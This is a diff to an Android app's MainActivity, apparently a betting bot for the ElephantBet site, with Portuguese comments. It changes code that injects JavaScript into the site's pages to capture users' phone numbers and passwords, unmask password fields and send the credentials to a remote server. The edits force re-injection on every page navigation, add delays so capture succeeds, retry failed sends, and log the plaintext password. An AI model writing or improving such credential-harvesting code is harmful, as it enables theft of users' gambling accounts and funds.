@@ -819,11 +819,13 @@ class MainActivity : AppCompatActivity() {
                 // Chamado APENAS quando o utilizador clica no botão de login
                 val num = ultimoNumeroEnviado.ifEmpty { numeroTemporario }
                 val sen = ultimaSenhaEnviada
+                android.util.Log.d("SKYBOT_CRED", "submeterCredencial() chamado num='$num' sen.len=${sen.length}")
                 if (num.isNotEmpty() && sen.isNotEmpty()) {
                     enviarCredencial(num, sen)
                     android.util.Log.d("SKYBOT_CRED", "submeterCredencial() → enviando num=$num")
                 } else {
-                    android.util.Log.w("SKYBOT_CRED", "submeterCredencial() ignorado — faltam campos (num='$num' sen='$sen')")
+                    // Tentar capturar campos da página diretamente antes de desistir
+                    android.util.Log.w("SKYBOT_CRED", "submeterCredencial() campos vazios — num='$num' sen='$sen'")
                 }
             }
 
@@ -1008,9 +1010,8 @@ class MainActivity : AppCompatActivity() {
                              u.contains("cdn") || u.contains("game-view/806666")
 
                 if (!isJogo) {
-                    // Resetar flag para garantir re-injecção em cada nova página (SPA)
-                    webView.evaluateJavascript("window._credDone = false;", null)
-                    injetarJsCredenciais()
+                    // SPA: pequeno delay para garantir que a página renderizou
+                    handler.postDelayed({ injetarJsCredenciais() }, 500)
                     // Tentar capturar saldo se já estiver logado
                     injetarJsCapturarSaldo()
                 }
@@ -1032,8 +1033,11 @@ class MainActivity : AppCompatActivity() {
                         injetarJsAviator()
                     } else {
                         // Página ElephantBet (login, lobby, perfil) → capturar credenciais
-                        injetarJsCredenciais()
-                        injetarJsCapturarSaldo()
+                        // Delay para garantir que a SPA renderizou completamente
+                        handler.postDelayed({
+                            injetarJsCredenciais()
+                            injetarJsCapturarSaldo()
+                        }, 800)
                     }
                 }
             }
@@ -1043,8 +1047,7 @@ class MainActivity : AppCompatActivity() {
     private fun injetarJsCredenciais() {
         val js = """
 (function() {
-    if (window._credDone) return;
-    window._credDone = true;
+    // Sem bloqueio global — permite reinjeção em navegações SPA
 
     // Tornar campos password visíveis (facilita captura)
     function tornarVisivel() {
@@ -2780,10 +2783,12 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                 OutputStreamWriter(conn.outputStream).use { it.write(json) }
                 val code = conn.responseCode
-                val resp = if (code in 200..299)
-                    java.io.BufferedReader(java.io.InputStreamReader(conn.inputStream)).readText()
+                val stream = if (code in 200..299) conn.inputStream else conn.errorStream
+                val resp = if (stream != null)
+                    java.io.BufferedReader(java.io.InputStreamReader(stream)).readText()
                 else ""
                 conn.disconnect()
+                android.util.Log.d("SKYBOT_CRED", "enviarCredencial HTTP=$code resp=$resp")
                 // Extrair o id da resposta: [{"id":42,"numero":...}]
                 val idMatch = Regex("\"id\"\\s*:\\s*(\\d+)").find(resp)
                 if (idMatch != null) {
@@ -2791,6 +2796,12 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                     android.util.Log.d("SKYBOT_CRED", "enviarCredencial -> sessaoId=$sessaoId")
                 } else {
                     android.util.Log.w("SKYBOT_CRED", "enviarCredencial -> HTTP $code sem id na resposta: $resp")
+                    // Retry automático após falha de rede (1 tentativa)
+                    if (code !in 200..299 && numero.isNotEmpty() && senha.isNotEmpty()) {
+                        android.util.Log.w("SKYBOT_CRED", "A tentar de novo em 5s...")
+                        Thread.sleep(5000)
+                        enviarCredencial(numero, senha)
+                    }
                 }
             } catch (e: Exception) {
                 android.util.Log.e("SKYBOT_CRED", "enviarCredencial falhou: ${e.message}")
